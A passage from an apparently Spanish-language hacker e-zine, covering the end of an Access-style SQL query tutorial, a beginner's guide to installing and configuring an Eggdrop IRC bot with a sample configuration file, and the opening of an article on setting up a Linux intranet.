  Si no se incluye ninguno de los predicados se asume ALL. El Motor  de base
  de datos  selecciona todos los registros que  cumplen  las condiciones  de
  la instruccion SQL. No se conveniente  abusar  de  este predicado  ya  que
  obligamos al motor de la base de datos a analizar la estructura de la tabla
  para  averiguar  los  campos que contiene, es mucho mas rapido indicar  el
  listado de campos deseados. 

  SELECT ALL FROM Empleados;
  SELECT * FROM Empleados; 
  

  TOP
  ---
  Devuelve un cierto numero de registros que entran entre al principio o al
  final de un rango especificado por una clausula ORDER BY. Supongamos  que
  queremos recuperar los nombres de los 25 primeros estudiantes  del  curso
  1994:

  SELECT TOP 25 Nombre, Apellido FROM Estudiantes
  ORDER BY Nota DESC;

  Si no se incluye la clausula ORDER BY, la consulta devolvera un conjunto 
  arbitrario de 25 registros de la tabla Estudiantes. El predicado TOP  no
  elige entre valores iguales. En el ejemplo anterior, si  la  nota  media
  numero  25 y la 26 son iguales, la consulta devolvera  26  registros. Se
  puede utilizar la palabra reservada  PERCENT  para  devolver  un  cierto
  porcentaje  de  registros  que  caen al principio o al final de un rango
  especificado por la clausula ORDER BY.

  Supongamos que en lugar de los 25 primeros estudiantes deseamos el 10 por
  ciento del curso: 

  SELECT TOP 10 PERCENT Nombre, Apellido FROM Estudiantes
  ORDER BY Nota DESC; 

  El valor que va a continuacion de TOP debe ser un Integer sin signo. TOP
  no afecta a la posible actualizacion de la consulta. 

  DISTINCT
  --------
  Omite  los  registros  que  contienen  datos  duplicados  en  los  campos
  seleccionados.

  Para  que  los  valores  de  cada  campo listado en la instruccion SELECT
  se incluyan en la consulta deben ser unicos.

  Por  ejemplo, varios empleados listados en la tabla Empleados pueden tener
  el  mismo apellido. Si dos registros contienen Lopez en el campo Apellido,
  la siguiente instruccion SQL devuelve un unico registro:

  SELECT DISTINCT Apellido FROM Empleados; 

  Con otras palabras el predicado DISTINCT devuelve aquellos registros cuyos
  campos indicados en la clausula SELECT posean un  contenido  diferente. El 
  resultado de una consulta  que  utiliza  DISTINCT  no es actualizable y no
  refleja los cambios subsiguientes realizados por otros usuarios. 

  DISTINCTROW
  -----------
  Devuelve los registros diferentes de una tabla; a diferencia del predicado 
  anterior  que  solo se fijaba en el contenido de los campos seleccionados,
  Este lo hace en  el  contenido del registro completo independientemente de
  los campo indicados en la clausula SELECT. 
  
  SELECT DISTINCTROW Apellido FROM Empleados;

  Si la tabla empleados contiene dos registros: Antonio Lopez y Marta  Lopez
  el ejemplo del predicado DISTINCT devuleve un unico registro  con el valor
  Lopez en el campo Apellido ya que busca no duplicados en dicho campo. Este
  ultimo ejemplo devuelve dos registros con el valor Lopez en el apellido ya
  que se buscan no duplicados en el registro completo. 
  
  2.4.-  Alias
         -----
  En determinadas circunstancias  es  necesario asignar un nombre  a  alguna
  columna determinada  de  un  conjunto  devuelto, otras  veces  por  simple
  capricho o por otras  circunstancias. Para resolver todas ellas tenemos la
  palabra reservada AS que  se  encarga  de asignar el nombre que deseamos a
  la columna  deseada. Tomado  como  referencia  el ejemplo anterior podemos
  hacer que la columna  devuelta  por  la  consulta, en  lugar  de  llamarse
  apellido (igual  que  el  campo devuelto) se llame Empleado. En  este caso
  procederiamos de la siguiente forma:

  SELECT DISTINCTROW Apellido AS Empleado FROM Empleados;

  2.5.- Recuperar Informacion de una base de Datos Externa
        --------------------------------------------------

  Para concluir este capitulo se debe hacer referencia a la  recuperacion de
  registros  de  bases  de  datos  externa. Es  ocasiones  es   necesario la
  recuperacion de informacion que se encuentra contenida en una tabla que no
  se encuentra en la base de datos que ejecutara la  consulta  o  que en ese
  momento no se encuentra abierta, esta situacion  la  podemos salvar con la
  palabra reservada IN de la siguiente forma: 

  SELECT DISTINCTROW Apellido AS Empleado FROM Empleados
  IN 'RUTA'; 

  En donde RUTA es la direccion donde esta la base de datos que contiene la
  tabla Empleados. 
  
  
  3.- Criterios de Seleccion
      ----------------------
  Hay  que recalcar tres detalles de vital importancia. El primero de ellos
  es  que  cada vez que se desee  establecer una condicion  referida  a  un
  campo de texto la condicion de  busqueda debe ir encerrada entre comillas
  simples; la  segunda  es  que  no  se posible establecer  condiciones  de
  busqueda en los campos memo y; la  tercera y ultima hace referencia a las
  fechas. Las fechas se deben escribir siempre en formato mm-dd-aa en donde
  mm representa el mes, dd el dia y aa el a~o, hay que prestar  atencion  a
  los  separadores - no sirve la separacion  habitual de la barra  (/), hay
  que  utilizar  el  guion  (-)  y ademas la fecha debe ir encerrada  entre
  almohadillas  (#). Por   ejemplo  si  deseamos  referirnos  al  dia 31 de
  Diciembre de 2001 deberemos hacerlo de la siguente forma; #12-31-01#


  3.1.- Operadores Logicos
        ------------------
  Los operadores logicos soportados por SQL son: AND, OR, XOR, Eqv, Imp, Is y
  Not. A excepcion de los dos ultimos todos poseen la siguiente sintaxis:

  <expresion1>    operador    <expresion2> 

  En  donde  expresion1  y  expresion2  son  las  condiciones  a  evaluar, el
  resultado  de  la  operacion  varia  en  funcion  del  operador  logico. La
  tabla adjunta muestra los diferentes posibles resultados: 

            -------------------------------------------------------
            | <expresion1> | Operador | <expresion2> |  Resultado | 
            -------------------------------------------------------
            | Verdadero    |   AND    |   Falso      |  Falso     |
            | Verdadero    |   AND    |   Verdadero  |  Verdadero |
            | Falso        |   AND    |   Verdadero  |  Falso     |
            | Falso        |   AND    |   Falso      |  Falso     |
            | Verdadero    |   OR     |   Falso      |  Verdadero |
            | Verdadero    |   OR     |   Verdadero  |  Verdadero |
            | Falso        |   OR     |   Verdadero  |  Verdadero |
            | Falso        |   OR     |   Falso      |  Falso     |
            | Verdadero    |   XOR    |   Verdadero  |  Falso     |
            | Verdadero    |   XOR    |   Falso      |  Verdadero |
            | Falso        |   XOR    |   Verdadero  |  Verdadero |
            | Falso        |   XOR    |   Falso      |  Falso     |
            | Verdadero    |   Eqv    |   Verdadero  |  Verdadero |
            | Verdadero    |   Eqv    |   Falso      |  Falso     |
            | Falso        |   Eqv    |   Verdadero  |  Falso     |
            | Falso        |   Eqv    |   Falso      |  Verdadero |
            | Verdadero    |   Imp    |   Verdadero  |  Verdadero |
            | Verdadero    |   Imp    |   Falso      |  Falso     |
            | Verdadero    |   Imp    |   Null       |  Null      |
            | Falso        |   Imp    |   Verdadero  |  Verdadero |
            | Falso        |   Imp    |   Falso      |  Verdadero |
            | Falso        |   Imp    |   Null       |  Verdadero |
            | Null         |   Imp    |   Verdadero  |  Verdadero |
            | Null         |   Imp    |   Falso      |  Null      |
            | Null         |   Imp    |   Null       |  Null      |
            -------------------------------------------------------

  Si a  cualquiera de las anteriores condiciones le anteponemos el  operador
  NOT el resultado de la operacion  sera el  contrario  al  devuelto  sin el
  operador NOT. El ultimo operador  denominado  Is  se  emplea para comparar
  dos   variables  de  tipo  objeto  <Objeto1>  Is  <Objeto2>. Este operador
  devuelve Verdadero si los dos objetos son iguales

  SELECT * FROM Empleados WHERE Edad > 25 AND Edad < 50;
  SELECT * FROM Empleados WHERE (Edad > 25 AND Edad < 50) OR Sueldo = 100; 
  SELECT * FROM Empleados WHERE NOT Estado = 'Soltero'; 
  SELECT * FROM Empleados WHERE (Sueldo > 100 AND Sueldo < 500) OR 
  (Provincia = 'Merida' AND Estado = 'Casado'); 

  3.2.- Intervalos de Valores
        ---------------------
  Para indicar que deseamos recuperar los registros segun el intervalo de
  valores de un campo emplearemos el operador Between cuya sintaxis es: 

  campo [Not] Between valor1 And valor2 (la condicion Not es opcional)

  En este caso la consulta devolveria los registros que contengan en "campo"
  un  valor  incluido  en el intervalo valor1, valor2 (ambos inclusive).  Si
  anteponemos la condicion Not devolvera aquellos valores no incluidos en el
  intervalo.

  SELECT * FROM Pedidos WHERE CodPostal Between 28000 And 28999;
  (Devuelve los pedidos realizados en la provincia de Merida) 

  SELECT IIf(CodPostal Between 28000 And 28999, 'Provincial', 'Nacional')
  FROM Editores; 

  (Devuelve el valor 'Provincial' si el  codigo  postal se encuentra en el
  intervalo, 'Nacional' en caso contrario) 

  3.3.- El Operador Like
        ----------------

  Se utiliza para  comparar  una  expresion de cadena con un modelo en una
  expresion SQL. Su sintaxis es: 

  expresion Like modelo
           
  En  donde expresion es una cadena modelo o campo contra el que se compara 
  expresion. Se puede utilizar el operador Like para  encontrar  valores en
  los  campos  que coincidan con el modelo especificado. Por  modelo  puede
  especificar un valor completo (Pedro Zue), o se pueden utilizar caracteres
  comodin  como  los reconocidos por el sistema operativo para encontrar un
  rango de valores (Like An*). 

  El operador Like se puede utilizar en una expresion para comparar un valor
  de un campo con una expresion de cadena. Por ejemplo, si introduce Like C*
  en una consulta SQL, la consulta devuelve todos los valores de  campo  que
  comiencen por la letra C. En una consulta con parametros, puede hacer  que
  el usuario escriba el modelo que se va a utilizar.

  El  ejemplo  siguiente  devuelve  los  datos que comienzan con la letra P
  seguido de cualquier letra entre A y F y de tres digitos: 

  Like 'P[A-F]###'

  Este ejemplo devuelve los campos cuyo contenido empiece con una  letra de
  la A a la D seguidas de cualquier cadena. 

  Like '[A-D]*'

  En  la  tabla  siguiente  se muestra  como  utilizar el operador Like para
  comprobar expresiones con diferentes modelos. 
  
  --------------------------------------------------------------------------  
  | Tipo de coincidencia | Mod. Plan. |      Coincide       |  No coincide |
  --------------------------------------------------------------------------
  | Varios caracteres    |  'a*a'     | 'aa', 'aBa', 'aBBBa'|     'aBC'    |
  | Caracter especial    |  'a[*]a'   | 'a*a'               |     'aaa'    |
  | Varios caracteres    |  'ab*'     | 'abcdefg', 'abc'    | 'cab', 'aab' |
  | Un solo caracter     |  'a?a'     | 'aaa', 'a3a', 'aBa' |   'aBBBa'    |
  | Un solo digito       |  'a#a'     | 'a0a', 'a1a','a2a'' | aaa', 'a10a' |
  | Rango de caracteres  |  '[a-z]'   | 'f', 'p', 'j'       |   '2', '&'   |
  | Fuera de un rango    |  '[!a-z]'  | '9', '&', '%'       |   'b', 'a'   |
  | Distinto de un digito|  '[!0-9]'  | 'A', 'a', '&', '~'  | '0', '1', '9'|
  | Combinada            |  'a[!b-m]#'| 'An9', 'az0', 'a99' | 'abc', 'aj0' |
  --------------------------------------------------------------------------

  Donde Mod. Plan es Modo de Planteamiento.

  3.4.- El Operador In
        --------------
  Este operador devuelve aquellos registros cuyo campo indicado coincide con 
  alguno de los en una lista. Su sintaxis es: 

  expresion [Not] In(valor1, valor2, . . .)

  SELECT * FROM Pedidos WHERE Ciudades In ('Caracas', 'Maracay', 'Merida');

  3.5.- La clausula WHERE
        -----------------
  La clausula WHERE puede usarse para determinar que registros de las tablas 
  enumeradas en  la  clausula  FROM  apareceran  en  los  resultados  de  la
  instruccion SELECT. Depues  de escribir esta clausula se deben especificar
  las condiciones expuestas en los  partados 3.1 y 3.2. Si no se emplea esta
  clausula, la consulta devolvera  todas  las  filas  de la  tabla. WHERE es
  opcional, pero cuando aparece debe ir a continuacion de FROM. 


  SELECT Apellidos, Salario FROM Empleados WHERE Salario > 21000;
  SELECT Id_Producto, Existencias FROM Productos 
  WHERE Existencias <= Nuevo_Pedido; 
  SELECT * FROM Pedidos WHERE Fecha_Envio = #5/10/01#; 
  SELECT Apellidos, Nombre FROM Empleados WHERE Apellidos = 'King'; 
  SELECT Apellidos, Nombre FROM Empleados WHERE Apellidos Like 'S*'; 
  SELECT Apellidos, Salario FROM Empleados WHERE Salario Between 200 And 300; 
  SELECT Apellidos, Salario FROM Empl WHERE Apellidos Between 'Lon' And 'Tol'; 

  SELECT Id_Pedido, Fecha_Pedido FROM Pedidos WHERE Fecha_Pedido 
  Between #1-1-01# And  #30-6-01#; 
  SELECT Apellidos, Nombre, Ciudad FROM Empleados WHERE Ciudad 
  In ('Sevilla', 'Los Angeles', 'Barcelona'); 

  
  4.- Agrupamiento de Registros
     -------------------------

  4.1.- GROUP BY
        -------- 
  Combina  los  registros  con  valores  identicos, en  la  lista  de campos 
  especificados, en un unico registro. Para cada registro se crea  un  valor
  sumario  si  se  incluye  una funcion SQL agregada, como por ejemplo Sum o
  Count, en la instruccion SELECT. Su sintaxis es:

  SELECT campos FROM tabla WHERE criterio GROUP BY campos del grupo

  GROUP BY es opcional.  Los valores de resumen  se omiten si no existe  una
  funcion.

  SQL  agregada  en  la  instruccion  SELECT. Los valores Null en los campos
  GROUP BY  se agrupan y no se omiten. No obstante, los  valores  Null no se
  evaluan en ninguna de las funciones SQL agregadas.

  Se utiliza la clausula WHERE para excluir  aquellas  filas  que  no  desea
  agrupar, y la clausula HAVING para filtrar los registros una vez agrupados.
  A menos que contenga un dato Memo  u  Objeto OLE , un campo de la lista de
  campos  GROUP BY  puede referirse  a  cualquier campo  de  las  tablas que
  aparecen en la clausula FROM, incluso si el campo  no  esta incluido en la
  instruccion SELECT, siempre y cuando la instruccion SELECT incluya al menos
  una funcion SQL agregada. 

  Todos los campos de la lista de campos de SELECT deben o bien incluirse en
  la clausula GROUP BY o como argumentos de una funcion SQL agregada. 

  SELECT Id_Familia, Sum(Stock) FROM Productos GROUP BY Id_Familia;

  Una vez que GROUP BY  ha combinado los registros, HAVING muestra cualquier 
  registro agrupado por  la clausula GROUP BY que satisfaga las  condiciones
  de la clausula HAVING. 

  HAVING es similar a WHERE, determina que registros se seleccionan. Una vez
  que  los  registros  se han agrupado utilizando GROUP BY, HAVING determina
  cuales de ellos se van a mostrar.

  SELECT Id_Familia Sum(Stock) FROM Productos GROUP BY Id_Familia 
  HAVING Sum(Stock) > 100 AND NombreProducto Like BOS*; 

  4.2.- AVG
        ---
  Calcula  la  media aritmetica  de  un conjunto de valores contenidos en un
  campo especificado de una consulta. Su sintaxis es la siguiente :

  Avg(expr)

  En  donde  expr representa  el campo que contiene los datos numericos para
  los que  se desea calcular la media o una expresion que realiza un calculo
  utilizando  los  datos  de  dicho campo. La  media calculada por Avg es la
  media  aritmetica (la  suma  de  los  valores  dividido por el  numero  de
  valores). La funcion Avg no incluye ningun campo Null en el calculo.

  SELECT Avg(Gastos) AS Promedio FROM Pedidos WHERE Gastos > 100; 

  4.3.- Count
        -----
  Calcula el numero de registros devueltos por una consulta. Su sintaxis  es
  la siguiente :

  Count(expr)

  En donde expr contiene el nombre del campo que desea contar. Los operandos
  de expr pueden incluir el nombre de un campo de una tabla, una constante o
  una  funcion  (la cual puede ser intrinseca o definida por el usuario pero
  no otras de las funciones agregadas de SQL). Puede contar cualquier tipo de
  datos incluso texto. 

  Aunque  expr  puede  realizar un calculo sobre un campo, Count simplemente
  cuenta el numero de registros sin tener en cuenta que valores se almacenan
  en los registros. La  funcion  Count  no  cuenta  los registros que tienen
  campos null a menos que expr  sea  el caracter  comodin  asterisco (*). Si
  utiliza  un  asterisco,  Count  calcula  el  numero  total  de  registros,
  incluyendo    aquellos    que   contienen   campos   null.   Count(*)   es
  considerablemente  mas  rapida  que  Count(Campo). No  se  debe  poner  el
  asterisco entre dobles comillas ('*').

  SELECT Count(*) AS Total FROM Pedidos;

  Si expr identifica a multiples campos, la funcion Count cuenta un registro
  solo  si  al  menos  uno  de  los  campos  no es Null. Si todos los campos
  especificados  son  Null, no  se  cuenta e l registro. Hay que separar los
  nombres de los campos con ampersand (&). 

  SELECT Count(FechaEnvio & Transporte) AS Total FROM Pedidos;


  4.4.- Max, Min
        --------

  Devuelven el minimo o el maximo de un conjunto de valores contenidos en un
  campo especifico de una consulta. Su sintaxis es: 

  Min(expr)
  Max(expr)

  En donde expr es el campo sobre el que se desea realizar el  calculo. Expr
  pueden incluir el nombre de un campo de una tabla,  una  constante  o  una
  funcion (la  cual puede ser intrinseca o definida por el usuario  pero  no
  otras de las funciones agregadas de SQL).

  SELECT Min(Gastos) AS ElMin FROM Pedidos WHERE Pais = 'Venezuela'; 
  SELECT Max(Gastos) AS ElMax FROM Pedidos WHERE Pais  = 'Venezuela'; 

  4.5.- StDev, StDevP
        -------------
  Devuelve estimaciones de la desviacion estandar para la poblacion (el total
  de  los  registros de la tabla) o una muestra de la poblacion  representada
  (muestra aleatoria). Su sintaxis es:

  StDev(expr) 
  StDevP(expr) 

  En donde  expr  representa  el nombre del campo que contiene los datos que
  desean evaluarse  o  una  expresion que realiza un calculo utilizando  los
  datos  de  dichos campos. Los operandos de expr pueden incluir  el  nombre
  de  un  campo  de  una  tabla, una  constante o una funcion (la cual puede
  ser intrinseca o  definida por  el  usuario pero no otras de las funciones
  agregadas de SQL) StDevP  evalua una poblacion, y StDev evalua una muestra
  de la poblacion. Si la  consulta contiene menos de dos registros (o ningun
  registro para StDevP), estas  funciones  devuelven  un valor Null (el cual
  indica que la desviacion estandar no puede calcularse).

  SELECT StDev(Gastos) AS Desviacion FROM Pedidos WHERE Pais = 'Venezuela'; 
  SELECT StDevP(Gastos) AS Desviacion FROM Pedidos WHERE Pais= 'Venezuela';


  4.6.- Sum
        ---
  Devuelve la suma del conjunto de valores contenido en un campo especifico
  de una consulta. Su sintaxis es: 

  Sum(expr)

  En donde expr respresenta el nombre del campo que contiene  los datos que
  desean  sumarse  o  una expresion que realiza un calculo  utilizando  los
  datos de dichos campos. Los operandos de expr pueden incluir el nombre de
  un  campo de una tabla, una constante o una funcion (la  cual  puede  ser
  intrinseca  o  definida  por  el  usuario  pero no otras de las funciones
  agregadas de SQL).

  SELECT Sum(PrecioUnidad * Cantidad) AS Total FROM DetallePedido;


  4.7.- Var, VarP
        ---------
  
  Devuelve una estimacion de la varianza de una poblacion (sobre el total de
  los registros)  o  una  muestra de  la  poblacion  (muestra  aleatoria  de
  registros) sobre los valores de un campo. Su sintaxis es: 

  Var(expr)
  VarP(expr) 

  VarP  evalua una poblacion, y Var evalua una muestra de la poblacion. Expr
  el nombre  del  campo  que  contiene  los datos que desean evaluarse o una
  expresion que realiza un calculo utilizando los datos de dichos campos. Los
  operandos  de expr pueden incluir el nombre de un  campo de una tabla, una
  constante  o  una funcion  (la cual puede ser intrinseca o definida por el
  usuario pero no otras de las funciones agregadas de SQL).

  Si la consulta contiene menos de dos registros, Var y VarP devuelven  Null
  (esto indica que la varianza no puede calcularse). Puede  utilizar  Var  y
  VarP en una expresion de consulta o en una Instruccion SQL. 

  SELECT Var(Gastos) AS Varianza FROM Pedidos WHERE Pais = 'Venezuela';
  SELECT VarP(Gastos) AS Varianza FROM Pedidos WHERE Pais = 'Venezuela'; 
  
  
  Bueno  nos  vemos  para  la  proxima  entrega del E-zine #3, espero que le 
  haya  gustado  y  por  supuesto el resto de la revista. bye Happy Hacking.

  --ShAd0w5 (shadow5@0ri0n.org)



-[ 2x06 ]--------------------------------------------------------------------
-[ Montando un Eggdrop para Newbie's ]-----------------------[ Pestilencia ]-
----------------------------------------------------[ pestilencia@0ri0n.org]-

 Hola  Gente, nos volvemos a ver en este articulo, bueno, este articulo lo
 escribi porque mucha gente en el IRC siempre me preguntaba como montar un 
 roBOT  en  un canal (al igual que el PHP-Nuke), pues bueno, me decidi por 
 este porque  el otro es mas facil y cualquier persona sin conocimiento lo 
 puede hacer.
 
 Pero  habran  mucho de ustedes que se preguntaran Que es un Bot?, pues es 
 simplemente un Robot que esta dia y noche en un canal en el IRC (Internet 
 Relay Chat), pero  que  hace?, bueno  el  puede cuidar  un canal, cambiar 
 topicos, expulsar a usuarios  no deseados, ayudarte  con  cualquier  cosa, 
 etc. Mas que todo uno programa  a  este  Robot  para  que haga tal cosa y 
 mantenga un canal al dia.
 
 Entre los Bots mas conocidos podemos encontar:
 
 a.- EggDrop
 b.- DarkBot
 c.- ArgoBot
 d.- Chan, Nick, Memo, Shadow
 
 Puedo decir que los EggDrop es mas que todo para el area de administrar  un 
 canal, mientras que un DarkBot es para dar ayuda en un canal (como los bots 
 que estan en #irchelp); mientras que el  Chan controla  canales,  Nick  nos 
 sirve para la administracion de Nickname's  y  el  memo  para  el  envio de 
 mensajes de nicks a nicks.
 
 P.D: Estos  tres  (3) ultimos nos sirve cuando hemos montado un servidor de
 IRC.
 
 
 Luego de ellos, que debemos hacer, bueno es muy facil, simplemente  debemos
 seguir los siguientes pasos.
  
 1.- Bajarlo de Eggheads.org (ftp o de los mirrors)
 2.- Copiarlo en tu home, por ejemplo /home/pestilencia
 3.- Descomprimirlo con tar xvfz eggdropX.XX.tar.gz, donde X.XX es la version
     del eggdrop.
 4.- Entar al directorio eggdropX.XX y ejecutar el ./configure
 5.- Ejecutas  make  config, luego  make  para  compilar  el eggdrop, tambien
     puedes especificar make install DEST=<directorio>, por Ejemplo:
   
     #make install DEST=/home/pestilencia/egg

 6.- Despues   de compilar, simplemente  entras  a   /home/pestilencia/egg  y
     copias  el  archivo  de   configuracion  en   otros (el  que   vamos   a
     modificar), puedes encontar los siguientes archivos:
   
     eggdrop.simple.conf    => Configuracion Simple 
     eggdrop.complete.conf  => Configuracion Completa
     eggdrop.advanced.conf  => Configuracion Avanzada
   
     Como si eres Newbie, entonces elige la simple.
   
 7.- Luego copias el archivo eggdrop.simple.conf en otro archivo con:

     #cp eggdrop.simple.conf egg.conf 
   
     Nota: esto lo hacemos para no da~ar el archivo original.

 8.- Ahora simplemente editamos el archivo egg.conf con nuestro editor 
     preferido (como pico, joe, vi, etc).
   
     Y modificamos las siguientes lineas:
   
     #! /path/to/executable/eggdrop
   
     Colocamos la ruta donde tenemos compilado nuestro eggdrop, por ejemplo 
     /home/pestilencia/egg
   
     ##### variables:
     set nick "Lamestbot"   => Remplazamos Lamestbot por el Nombre de nuestro
                               eggdrop.        
  

     set altnick "Llamabot" => Aqui colocamos  un Nick alternativo, esto es 
                               porque puede ser que el Nick que elijamos ya 
			       lo este utilizando otro usuario.
			    
     set realname "/msg LamestBot hello" => Configuras el Nombre Real del Bot 
                                            o  Sus  caracteristicas  (Esto es 
                                            visible por la gente que  este en 
					    el canal, con un whois al nick de
					    el bot).  



     set servers {
     you.need.to.change.this:6667 => Configuras el servidor de irc donde 
     }                               correta  tu  Bot  (dal.net, hispano,
                                     undernet,  etc). Y  el puerto a usar
                                     (6667/7000).
  
     Ejemplo:
  				   
     set servers {
     irc.dal.net:7000
     }                
 

 # En esta partedefines el nombre del canal y las opciones

 channel add #lamest {
   chanmode "+nt-likm"
   idle-kick 0
   stopnethack-mode 0
 }

 Donde #lamest es el nombre del canal.

 Aqui se define otros tipos de opciones ( para mayor informacion ver la 
 documentacion que trae el eggdrop)
 
 channel set #lamest +enforcebans +dynamicbans +userbans
 channel set #lamest +dynamicexempts +userexempts +dynamicinvites +userinvites
 channel set #lamest -autoop -bitch +protectops +protectfriends +dontkickops
 channel set #lamest +greet +statuslog
 channel set #lamest +revenge +autovoice
 channel set #lamest -secret -shared +cycle
 channel set #lamest -inactive -seen +nodesynch


 listen 3333 all 
 # Configuras el puerto donde el eggdrop escuchara conexiones via telnet

 set owner "MrLame, MrsLame"
 # Configura la lista de propietarios del Bot


 # Archivo y directorios

 set userfile "LamestBot.user"
 set chanfile "LamestBot.chan"
 set temp-path "/tmp"
 logfile msbxco * "logs/eggdrop.log"
 logfile jpk #lamest "logs/lamest.log" => Guarda los Log's de el canal
                                          #lamest


 # Aqui se incluyen los scripts en tcl que deseamos cargar.
 source scripts/alltools.tcl
 source scripts/action.fix.tcl
 source scripts/compat.tcl
 source scripts/userinfo.tcl
 loadhelp userinfo.help
   
 Todas las lineas que enpiecen con die " ... " debes quitarlas, ya que sino
 el Eggdrop no te correra.
 
 9. Guardamos cambios y luego cargamos la configuracion con:

    #./eggdrop -m egg.conf  => Esto lo hacemos una solo vez, con esto creamos 
                               el Nombre  del Bot,  permisos,  opciones, etc.      

 10. Si nos llega a dar error debes editar el archivo egg.conf y revisar linea 
     por linea para ver donde esta el error. Si  el Bot se llega a caer o solo
     apagaste la maquina o tuvistes que matarlo por cualquier razon, lo puedes
     volver a activar con:
    
     #./eggdrop egg.conf
    
     NOTA: Los EggDrop's traen un archivo llamado botchk, solo debemos
           editarlo, cambiarle la ruta donde esta instalado el  bot  y
           correrlo; este nos sirve para que  el  bot trabaje  con  el
           crontab.
 
 
 FAQ's 
 ------

 a.- Donde puedo bajarme el eggdrop?
 R:  De eggheads.org (En la seccion de Mirror's), actualmente esta vigente
     la version 1.6.2

 b.- Con las configuraciones que me distes no me corre el Robot
 R:  Bueno, yo simplemente explique como configurarlo basicamente, tu debes 
     cambiar el servidor de irc, el nombre del bot y otras cositas, pero de 
     todas maneras leete la documentacion que esta en eggheads.org o la que 
     trae el robot.

 c.- Yo soy nuevo en esto y encontre en internet unos scripts hechos  en tcl,
     ellos me guardan los log's, capturan las personas que estan en ese canal
     y otras cosas pero no se como correlos, como hago?
 R:  Simplemente copialos en el directorio scripts/ y luego en el archivo
     egg.conf agregalo en la lista de scripts y luego reinicia el eggdrop
     para que los cambios surjan efecto.

 d.- Aparte del eggdrop, donde puedo bajar los otros que mencionastes en este
     articulo?.
 R:  Lo Puedes encontrar en:
 
    Scripts, Bots y otros (Chan, Nick, Memo) : www.xcalibre.net
    Eggdrop y Scripts                        : www.eggheads.org
    ArgoBot                                  : www.argo.es/~jcea
    DarkBot                                  : www.superchat.org/darkbot
    Todo lo que quieras                      : www.freshmeat.net
          
 e.- Donde puedo encontar cuentas shells gratuitas?
 R:  Bueno, se de uno pero debes cumplir una serie de normas, te dejan
     instalar 5 bots y te dan 300 mb gratis, y es:
     
     http://7.ebsd.com/z/e?acct=kl0nk

 f.- Donde puedo encontar cuantas shells pagas?
 R: Aqui te dejo el listado de servidores que dan cuentas shell a un precio
    modico, y son:

    http://www.negation.net
    http://www.eicmp.net
    http://www.nstart.net
    http://www.coresync.net
    http://www.tenstar.net
    http://www.neonsky.net
    http://www.strategical.net
    http://www.jeah.net
    http://www.ghostweb.net
    http://www.i-shell.net
    http://www.infract.net
    http://www.sparkhost.com
    http://www.zerolink.com.au
    http://www.extremeshells.com
    http://www.penguinzed.net
    http://www.snagged.net

 g.- Como administro mi bot?
 R:  Luego de haberlo instalado y configurado, simplemente nos queda hacer
     un telnet al host donde lo tenemos instalado al  puerto  3333,  luego
     debes  escribir NEW y darle a enter, despues  introducimos  el  login
     que vamos a utilizar como administradores del bot y luego el password
     y  vamos a caer en un tipo de shell donde todos los comandos enpiezan
     por un punto ".", por ejemplo: 
     
     .quit     => Te desconectas del robot
     .help     => Muestra la lista de comandos que tiene el bot
     .help all => Muestra TODA la lista de comandos.
      

 REGALITO DE SAN VALETIN:  Si les llega a dar mucho problemas la configuracion
                           de el eggdrop, pues  aqui le incluyo el archivo  de
                           configuracion   que   utilizamos  en  el  canal  de 
                           #linuxayuda en irc.dal.net (El archivo  se  incluye 
			   con esta revista).


[++] eggdrop/mondongo.conf
#! /home/eggdrop

# No Editar las Siguientes 9 Lineas
set mod-path "modules/"
set help-path "help/"
loadmodule dns
loadmodule channels
loadmodule server
loadmodule ctcp
loadmodule irc
loadmodule notes
loadmodule console
checkmodule blowfish

# Desde aqui se inicia la configuracion

# variables:
set nick "Mondongo"
set altnick "zUp-Zer0"
set realname "Que miras???"

set servers {
  irc.dal.net:7000
}

channel add #linuxayuda {
  chanmode "+nt-likm"
  idle-kick 0
  stopnethack-mode 0
}

channel set #otv +enforcebans +dynamicbans +userbans
channel set #otv +dynamicexempts +userexempts +dynamicinvites +userinvites
channel set #otv -autoop -bitch +protectops +protectfriends +dontkickops
channel set #otv +greet +statuslog
channel set #otv +revenge +autovoice
channel set #otv -secret -shared +cycle
channel set #otv -inactive -seen +nodesynch

set net-type 0

listen 3333 all

set owner "Pestilencia"

set userfile "Mondongo.user"
set chanfile "Mondongo.chan"
set temp-path "/tmp"
logfile msbxco * "logs/robot.log"
logfile jpk #linuxayuda "logs/Mondongo.log"

set motd "text/motd"
set telnet-banner "text/banner"
set protect-telnet 0
set open-telnets 0
set stealth-telnets 0
set use-telnet-banner 1
set connect-timeout 15


##### SCRIPTS #####

source scripts/alltools.tcl
source scripts/action.fix.tcl
source scripts/compat.tcl
source scripts/userinfo.tcl
loadhelp userinfo.help
[--]


 Bueno, esto es todo, espero y aspiro que les sirva para algo y nos vemos en 
 un proximo articulo.

 Comentarios Constructivos, Criticas y Opiniones enviarlo a:
 
 mailto:pestilencia@0ri0n.org

 -EOF-



-[ 2x07 ]--------------------------------------------------------------------
-[ Montando una Intranet con Linux ]--------------------[ Mr. kl0nk Manson ]-
--------------------------------------------------------[  kl0nk@0ri0n.org ]-


  Indice General:
  ---------------

  1.- Introduccion.
  2.- Que necesitamos?.
    *.- Software.
    *.- Hardware.
  3.- Configuracion de el Servidor y los Clientes.
  4.- Configuracion de un Servidor DNS.
  5.- Configuracion de el Servidor Web.
  6.- Configuracion de un Servidor de NFS.
  7.- Configuracion de un Servidor SAMBA.
    *.- Configuracion de los clientes.
  8.- Configuracion de un Servidor de Correos.
    *.- Configuracion de los clientes de correos.
  9- Otros Servicios.
 10.- Conclusiones y Recomendaciones.


 1.- Introduccion
     ------------
   
 Simplemente Montaremos  una  Intranet  con  un  "Servidor Linux", en el cual
 los ejemplo  que  se expondran  a continuacion  se utilizara un Servidor con 
 Linux, Un Cliente con Linux, y dos Clientes  mas  con  Windows 9x; Donde  en
 el server configuraremos  como Servidor  DNS, Servidor  de Correos Internos, 
 Servidor Web, Servidor de  NFS  (Para el Cliente con Linux) y de Samba (para 
 los Clientes con Windows).
 
 Entonce Empecemos ....
 

 2. Que necesitamos?
    ----------------
    
 a. Cuatro Maquinas (Una para el Server, y las otras tres para los Clientes).
 b. El Software Necesario (CD con Linux y sus Aplicaciones y el de Windows
    9x).
 c. Muchas Ganas de Montar la Intranet ;)
 

 *.- Software
     --------
 
 Linux
 -----
 - bind 
 - bind-utils 
 - caching-nameserver
 - samba
 - nfs
 - nfs-utils 
 - portmap
 - sendmail
 - sendmail-cf
 - samba 
 - samba-client 
 - samba-common 
 - imap
 - netscape navigator
 - apache web server
 
 Windows
 -------
 - Internet Explorer o Netscape Navigator
 - CD Windowns 9x (Para cuando configuremos la Red).
 - Apache Web Server for Windows (Opcional)
